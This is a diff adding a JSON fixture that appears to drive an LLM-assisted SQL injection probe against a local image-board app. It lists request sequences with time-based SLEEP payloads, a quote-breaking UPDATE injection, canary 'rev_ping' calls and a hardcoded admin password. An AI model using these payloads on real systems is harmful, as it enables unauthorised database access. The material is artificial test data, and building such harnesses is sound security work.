@@ -1,0 +1,264 @@
+[
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:3600",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "open_index",
+          "method": "GET",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {},
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "sqli_like_toggle",
+          "method": "GET",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {
+            "like": "<like_payload>",
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {},
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "like_payload"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "like_payload": [
+        "1",
+        "1 OR SLEEP(2)",
+        "1 OR (SELECT SLEEP(2))",
+        "1 OR rev_ping(0x61746f6d626f61726430)"
+      ]
+    }
+  },
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:3600",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "open_manage_login",
+          "method": "GET",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {
+            "manage": "1"
+          },
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "manage_login",
+          "method": "POST",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "manage": "1"
+          },
+          "body": {
+            "managepassword": "123456789"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "sqli_manage_lift",
+          "method": "GET",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {
+            "manage": "1",
+            "bans": "1",
+            "lift": "<lift_payload>",
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {},
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "lift_payload"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "lift_payload": [
+        "1",
+        "1+SLEEP(2)",
+        "1+(SELECT SLEEP(2))",
+        "1+rev_ping(0x61746f6d626f61726431)"
+      ]
+    }
+  },
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:3600",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "open_manage_login",
+          "method": "GET",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {
+            "manage": "1"
+          },
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "manage_login",
+          "method": "POST",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "manage": "1"
+          },
+          "body": {
+            "managepassword": "123456789"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "seed_thread_for_editpost",
+          "method": "POST",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "parent": "0",
+            "name": "seed",
+            "email": "",
+            "subject": "seed",
+            "message": "seed",
+            "password": ""
+          },
+          "extract": {}
+        },
+        {
+          "step": 4,
+          "name": "sqli_manage_editpost_message",
+          "method": "POST",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "manage": "1",
+            "editpost": "1",
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "message": "<editpost_message_payload>"
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "editpost_message_payload"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "editpost_message_payload": [
+        "probe-edit",
+        "x', message=(SELECT SLEEP(2)) -- -",
+        "x', message=(SELECT rev_ping(0x61746f6d626f61726432)) -- -"
+      ]
+    }
+  },
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:3600",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "seed_thread_for_parent",
+          "method": "POST",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "parent": "0",
+            "name": "seed",
+            "email": "",
+            "subject": "seed",
+            "message": "seed",
+            "password": ""
+          },
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "sqli_insert_post_parent",
+          "method": "POST",
+          "url": "/imgboard.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "parent": "<parent_payload>",
+            "name": "admin",
+            "email": "",
+            "subject": "probe",
+            "message": "probe",
+            "password": ""
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "parent_payload"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "parent_payload": [
+        "1",
+        "1+SLEEP(2)",
+        "1+(SELECT SLEEP(2))",
+        "1+rev_ping(0x61746f6d626f61726433)"
+      ]
+    }
+  }
+]
